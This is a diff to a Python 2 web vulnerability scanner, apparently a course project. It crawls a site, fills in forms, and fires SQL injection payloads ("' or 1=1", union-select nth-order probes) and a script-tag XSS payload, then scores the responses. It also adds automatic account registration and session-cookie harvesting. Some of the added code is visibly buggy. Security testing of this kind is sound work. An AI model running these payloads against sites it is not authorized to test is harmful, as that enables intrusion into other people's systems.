@@ -28,7 +28,6 @@ import math
 import nltk
 import re
 import requests
-#requests.packages.urllib3.disable_warnings()
 import sys
 import time
 import urllib
@@ -56,26 +55,25 @@ def getValidResponse(params, action, url, cookies):
     for key in params:	  
         value = params[key]
 	formInput[key] = generateValue(value['label'],value['type'])
-    print cookies, type(cookies)
-    validResponse = constructPostRequest(formInput, cookies, action)
+    #print cookies, type(cookies)
+    (header,validResponse) = constructPostRequest(formInput, cookies, action)
     return validResponse
 
 #####################################################################################################################
 # This method constructs a HTTP Post Request to submit the form to it
+# Inputs:
+	
+#Output:
 #####################################################################################################################
 
 def constructPostRequest(formInput, input_cookies, action):
-	#cookies = dict(cse591='kP047iYtubEZ6ZnMKmxO')
 	r = requests.post(action, data=formInput, verify=False, cookies=input_cookies)	
-	#print r.headers
-	#print r.status_code
-	#print r.text
-	return r.text
+	return (r.headers,r.text)
 
 #####################################################################################################################
 # This method takes in a form to be filled and the url and inserts <scripts> into the fields.
 # Inputs:
-#       params[] (List[String]): list of parameters along with the types in the following format. 
+#       params{} (Dictionary): list of parameters along with the types in the following format. 
 #                               ex: ["username::text", "password::password"]
 #       action (String): The action the form should take when submitted 
 # Output:
@@ -87,9 +85,16 @@ def getXssResponse(params, action, url, cookies):
     for key in params:	  
         value = params[key]
 	formInput[key]="<sCript>xssAttack</sCript>"
-    xssInjResponse = constructPostRequest(formInput,cookies,action)
+    (header,xssInjResponse) = constructPostRequest(formInput,cookies,action)
     return xssInjResponse
-    
+
+#####################################################################################################################
+# This method computes the XSS injection score for the given response
+# Inputs:
+	
+#Output:
+#####################################################################################################################
+
 def getXssScore(xssResponse, input_cookies): 
     urls = open("crawledURLs.txt")
     for url in urls:        
@@ -110,18 +115,10 @@ def getXssScore(xssResponse, input_cookies):
 
 def getSqlInjResponse(params, action, url, cookies):        
     formInput={} 
-    #if(action == ""):
-    #    action = url
-    #parsedURL = urlparse(url);
-    #dirPath = path.split(parsedURL.path)
-    #fullPath=parsedURL.scheme+"://"+parsedURL.netloc+dirPath[0]+"/"
-    #if(parsedURL.netloc not in action):
-    #    action = parsedURL.scheme+"://"+parsedURL.netloc+action
-    #print action
     for key in params:	  
         value = params[key]
 	formInput[key] ="' or 1=1 --'"
-    sqlInjResponse = constructPostRequest(formInput,cookies,action)
+    (header,sqlInjResponse) = constructPostRequest(formInput,cookies,action)
     return sqlInjResponse
 
 #####################################################################################################################
@@ -139,6 +136,13 @@ def getSimilarityScore(html_1, html_2):
     cleanResponse2 = BeautifulSoup(html_2).get_text()
     return calculateCosineSimilarity(formatVector(cleanResponse1), formatVector(cleanResponse2))
 
+#####################################################################################################################
+# The method calculates the cosine similarity between two groups
+# Inputs:
+	
+#Output:
+#####################################################################################################################
+
 def calculateCosineSimilarity(group1, group2):
     doc1sq = doc2sq = frequency = 0
     for i in group1:
@@ -151,7 +155,14 @@ def calculateCosineSimilarity(group1, group2):
         
     score = float(frequency) / (math.sqrt(doc1sq) * math.sqrt(doc2sq))
     return score
-   
+
+#####################################################################################################################
+# This method constructs a HTTP Post Request to submit the form to it
+# Inputs:
+	
+#Output:
+#####################################################################################################################
+
 def formatVector(response):
     global stopWords
     cleanResponse = map(lambda x:re.split(" ", x), re.split("\n", response))
@@ -194,10 +205,17 @@ def getLabel(orglabel):
         if(score > maxscore):
             maxscore = score
             newlabel = 'username'
-    print 'Max score' + str(maxscore), 'Label' + newlabel
+    #print 'Max score' + str(maxscore), 'Label' + newlabel
     if(maxscore<0.5):
         newlabel = orglabel
     return newlabel
+
+#####################################################################################################################
+# This method generates random values based on the form field type and implements intelligent form filling
+# Inputs:
+	
+#Output:
+#####################################################################################################################
 
 def generateValue(label, labeltype):
     if labeltype == 'text':
@@ -221,7 +239,6 @@ def generateValue(label, labeltype):
 # Get the specific form parameters
 def getFormParams(link):
     params = {}
-    # Get Labels from the form
     labels = []
     source = link['source'].replace("\n","")
     for i in range(0, len(source)):
@@ -240,8 +257,6 @@ def getFormParams(link):
 	params[j['name']]['type'] = j['type']
 	params[j['name']]['label'] = labels[0]
 	i = i + 1
-#        params.append(j['name'])
-    
     return (link['target'], params)
         
 
@@ -279,6 +294,96 @@ def getCookies():
     return cookies
 
 #####################################################################################################################
+# Method to inject malicious input values into the application to check if nth order SQL injection is possible
+
+#####################################################################################################################
+
+def nthOrderSQLInjection(params, action, url, cookies, index, urlForms):
+	UserName = "reverse_12345"
+        Password = "aXb675hjWF@"
+	SQLKeyWord = "' union select "
+	TableInfo = 'from dual;--'
+	responseString = None
+
+	for i in range(0,5):
+		formInput = {}
+		ParameterPadding = 'Null,' * i
+		Parameter = '"Evilmax"' + str(index) + ' '
+		MaliciousInputValue = UserName + SQLKeyWord + ParameterPadding + Parameter + TableInfo  
+		for key in params:
+			value = params[key]
+			if value['type'] != 'password':
+				formInput[key] = MaliciousInputValue
+			else:
+				formInput[key] = Password
+		constructPostRequest(formInput, cookies, action)
+		for urlForm in urlForms:
+			(newAction, newParams) = getFormParams(urlForm)
+			newFormInput = {}
+			for newParam in newParams:
+				value = newParams[newParam]
+				if value['type'] != 'password':
+					newFormInput[newParam] = UserName
+				else:	
+					newFormInput[newParam] = Password
+			(header, response) = constructPostRequest(formInput, cookies, newAction)
+			if 'EvilMax' in response:
+				SplitString = response.split("EvilMax")
+				Index = SplitString[1].split(' ')
+				if index != Index:
+					responseString = responseString + "nth Order SQL injection present in " + newAction + "\n"
+	return responseString
+				
+#####################################################################################################################
+# The method takes the URLs extracted from the crawler scrapy and performs a "deeper" crawling by seeing if the
+# server is setting any cookies after login and adds that to the list of cookies.
+#Output: Updates cookies (Dictionary)
+#####################################################################################################################
+
+def deepCrawling(urlForms,cookies):
+	storedFormInputs=[]
+	formInput={}
+	login=False
+	for urlForm in urlForms:
+		(action, params) = getFormParams(urlForm)
+		credentials = {'username': None, 'password' : None}
+		for key in params:
+			value = params[key]
+			if value['type'] != 'submit':
+				formInput[key] = generateValue(value['label'],value['type'])
+				newLabel = getLabel(value['label'])
+				if newLabel == 'username':
+					credentials['username'] = formInput[key]
+				if value['type'] == 'password':
+					credentials['password'] = formInput[key]
+		if credentials:
+			storedFormInputs.append(credentials)
+		(header,response) = constructPostRequest(formInput,cookies,action)
+		if "registered" in response.lower() or "created" in response.lower() or "authenticated" in response.lower():
+			login=True
+
+	if login == True:
+		for urlForm in urlForms:
+			(action, params) = getFormParams(urlForm)
+			for storedFormInput in storedFormInputs:
+				formInput = {}
+				for key in params:
+					value = params[key]
+					newLabel = getLabel(value['label'])
+					if newLabel == 'username': 
+						formInput[key] = storedFormInput['username']
+					if value['type'] == 'password' and storedFormInput['password']:
+						formInput[key] = storedFormInput['password']
+				(header, response) = constructPostRequest(formInput,cookies,action)
+				if 'set-cookie' in header.keys():
+					newCookie = str(header['set-cookie']).split(';')[0]
+					CookieSplit = str(newCookie).split('=')
+					cookies[CookieSplit[0]] = CookieSplit[1]
+	return cookies
+				
+						
+		
+#####################################################################################################################
 # This is the main method that gets called and submits the report on possible vulnerabilities
 #####################################################################################################################
 
@@ -288,12 +393,12 @@ def main():
     getStopWords()
    
     # Add the required headers, most likely its just the login cookie for the page.
-    opener = urllib2.build_opener()
-    opener.addheaders.append(('Cookie', 'cse591=kP047iYtubEZ6ZnMKmxO'))
-    domain = "129.219.253.30:80" 
+    #opener = urllib2.build_opener()
+    #opener.addheaders.append(('Cookie', 'cse591=kP047iYtubEZ6ZnMKmxO'))
+   # domain = "129.219.253.30:80" 
     url = raw_input("Enter the web address: ")
     cookies = getCookies()
-    
+    domain = urlparse(url).netloc
     # Remove any residual files
     system("rm items.json")
     system("rm crawledURLs.txt")
@@ -301,7 +406,7 @@ def main():
     system("rm reverse_response")
     
     
-    # Use Scrappy to get recursively get all URLs, Stores the 
+    # Use Scrapy to get recursively get all URLs, Stores the 
     system("scrapy crawl ReverseCrawler -a domain="+domain+" -a start_urls="+url+" -a cookies=\""+str(cookies)+"\" -o items.json")
     #cookies = ast.literal_eval(cookies)
     
@@ -315,7 +420,14 @@ def main():
     reportFile = open('reverse_report','w')
     responseFile = open('reverse_response','w')
     
+    # Perform a deeper crawling and re-crawl using scrapy to fetch more URLs
+    cookies = deepCrawling(UrlForms,cookies)
+    system("rm -f items.json")
+    system("scrapy crawl ReverseCrawler -a domain="+domain+" -a start_urls="+url+" -a cookies=\""+str(cookies)+"\" -o items.json")
+    UrlForms = json.load(open("items.json"))
+    
     # Iterate through all possible forms 
+    index = 0
     for urlForm in UrlForms:                
         (action, params) = getFormParams(urlForm) 
         print "[INFO] action: ", action
@@ -330,7 +442,6 @@ def main():
         responseFile.write(BeautifulSoup(validResponse).get_text() + "\n")
         responseFile.write("############################ Start SQL Injection response ###########################\n")
 	      
-	      
 	# Attempt SQL Injection and Get the score
         sqlInjResponse = getSqlInjResponse(params, action, url, cookies)        
         responseFile.write(BeautifulSoup(sqlInjResponse).get_text() + "\n")
@@ -338,6 +449,9 @@ def main():
         sqlInjectionScore = float(1) - getSimilarityScore(validResponse, sqlInjResponse)
         print "[INFO] SQL_INJ_Score = ", sqlInjectionScore        
         
+	# Attempt nth Order SQL injection
+	responseString = nthOrderSQLInjection(params, action, url, cookies, index, UrlForms)
+	
         # Attempt XSS and get the score
         xssResponse = getXssResponse(params, action, url, cookies)
         responseFile.write("%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n")
@@ -349,9 +463,12 @@ def main():
         reportFile.write("[Action]:: " + action + "\n")
         reportFile.write("[SQL_Inj_Score]:: " + str(sqlInjectionScore) + "\n")
         reportFile.write("[XSS_Inj_Score]:: " + str(xssScore) + "\n\n")
+	if responseString is not None:
+		reportFile.write("[nth Order SQL Injection]::" + responseString + "\n")
         
         print "\n\n"
 		
+	index = index + 1
     # Close the report
     reportFile.close()     
     responseFile.close()                          
